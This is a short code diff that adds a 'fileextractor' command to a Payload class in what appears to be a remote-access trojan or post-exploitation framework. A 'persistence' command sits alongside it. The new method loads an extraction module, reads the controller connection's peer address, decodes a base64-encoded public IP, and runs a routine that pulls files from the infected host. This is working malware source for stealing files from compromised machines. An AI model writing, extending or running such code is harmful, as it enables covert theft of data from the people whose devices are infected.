@@ -940,6 +940,23 @@ class Payload():
             log(result)
             return result
 
+    @config(platforms=['linux','linux2'], command=True, usage='fileextractor')
+    def fileextractor(self, args=None):
+        """
+        Extract certain files from host device
+        """
+        try:
+            if 'fileextractor' not in globals():
+                self.load('fileextractor')
+            host, port = self.connection.getpeername()
+            ip = base64.b64decode(self.info.get('public_ip')[6:]).decode('ascii')
+            data = globals()['fileextractor'].run(ip,host,port,args)
+            return data
+        except Exception as e:
+            result = "{} error: {}".format(self.fileextractor.__name__, str(e))
+            log(result)
+            return result
+
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='persistence <add/remove> [method]')
     def persistence(self, args=None):
